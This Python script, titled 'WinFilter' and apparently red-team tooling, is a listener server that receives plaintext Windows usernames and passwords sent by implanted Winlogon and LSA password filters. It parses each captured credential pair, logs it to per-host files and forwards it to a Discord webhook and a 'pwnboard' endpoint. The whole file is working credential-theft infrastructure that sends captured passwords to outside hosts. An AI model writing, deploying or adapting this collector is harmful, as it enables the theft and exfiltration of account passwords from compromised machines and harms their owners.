import socket
import requests
import threading
import argparse
import os
import datetime

print_lock = threading.Lock()

def handle_client(conn, addr, args):
    data = conn.recv(1024)
    print("TEST ", data)
    password = (data[data.index(b"\x11") + 1 : data.index(b"\x12")]).decode('ascii', errors='ignore')

    if b"\x40\x40" in data: # @@ 
        type = "WinLogon"
        username = (data[ : data.index(b"\x40\x40")]).decode('ascii', errors='ignore')
    else:
        type = "Password Change"
        username = (data[ : data.index(b"\x11")]).decode('ascii', errors='ignore')
    if "cloudbase" in username:
        return

    timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
    ip = (data[data.index(b"\x12") + 1 : data.index(b"\x13")]).decode('ascii', errors='ignore')
    storage = f"\nTimestamp: {timestamp}\nSource: {ip}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
    print(storage)

    if args.discord != "X":
        discordWH(ip, username, password, args.discord)

    if args.write:
        writeFile(storage, ip)

    if args.pwnboard != "X":
        updatePwnboard(ip, username, password, args.pwnboard)

    if not data:
        print_lock.release()


def discordWH(addr, username, password, url):
    # Setup Post Request
    post = {}
    data = {"content": f"{addr} | {username}:{password}", "username": "WinFilter"}

    # Send and check result
    result = requests.post(url, json=data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

def updatePwnboard(ip, username, password, url):
    data = {'ip': ip, 'service': 'system', 'username': username, 'password': password, 'message': "credentials from winfilter"}
    try:
        req = requests.post(url, json=data, timeout=3)
    except Exception as E:
        print(E)

def writeFile(storage, ip):
    with open(f"creds/{ip}", "a") as f:
        f.write(storage)


def main():
    print(
        """                                                                                                                     

  _____            ____  _____   ______         _____   ____  ____      _________________      ______        _____   
 |\    \   _____  |    ||\    \ |\     \   ____|\    \ |    ||    |    /                 \ ___|\     \   ___|\    \  
 | |    | /    /| |    | \\    \| \     \ |    | \    \|    ||    |    \______     ______/|     \     \ |    |\    \ 
 \/     / |    || |    |  \|    \  \     ||    |______/|    ||    |       \( /    /  )/   |     ,_____/||    | |    |
 /     /_  \   \/ |    |   |     \  |    ||    |----'\ |    ||    |  ____  ' |   |   '    |     \--'\_|/|    |/____/ 
|     // \  \   \ |    |   |      \ |    ||    |_____/ |    ||    | |    |   |   |        |     /___/|  |    |\    \ 
|    |/   \ |    ||    |   |    |\ \|    ||    |       |    ||    | |    |  /   //        |     \____|\ |    | |    |
|\ ___/\   \|   /||____|   |____||\_____/||____|       |____||____|/____/| /___//         |____ '     /||____| |____|
| |   | \______/ ||    |   |    |/ \|   |||    |       |    ||    |     |||`   |          |    /_____/ ||    | |    |
 \|___|/\ |    | ||____|   |____|   |___|/|____|       |____||____|_____|/|____|          |____|     | /|____| |____|
    \(   \|____|/   \(       \(       )/    )/           \(    \(    )/     \(              \( |_____|/   \(     )/  
     '      )/       '        '       '     '             '     '    '       '               '    )/       '     '   
            '                                                                                     '                  
"""
    )
    parser = argparse.ArgumentParser(
        description="Receive creds from Winlogon + LSA Filters"
    )
    parser.add_argument(
        "--ip",
        type=str,
        nargs="?",
        const=1,
        help="IP to listen on (default: 0.0.0.0)",
        default="0.0.0.0",
    )
    parser.add_argument(
        "--pwnboard",
        type=str,
        nargs="?",
        const=1,
        help="pwnboard url to utilize",
        default="X"
    )
    parser.add_argument(
        "--discord",
        type=str,
        nargs="?",
        const=1,
        help="discord url to utilize",
        default="X"
    )
    parser.add_argument(
        "--port",
        type=int,
        nargs="?",
        const=1,
        help="Port to listen on (default: 80)",
        default=80,
    )
    parser.add_argument("--write", dest="write", action="store_true")
    parser.set_defaults(write=False)
    args = parser.parse_args()

    if args.write:
        os.system("mkdir -p creds")
    
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(f"Listening on {args.ip}:{args.port}\n")
    s.bind((args.ip, args.port))
    s.listen(100)

    try:
        while True:
            conn, addr = s.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr, args,))
            t.start()

    except KeyboardInterrupt:
        exit(0)


main()
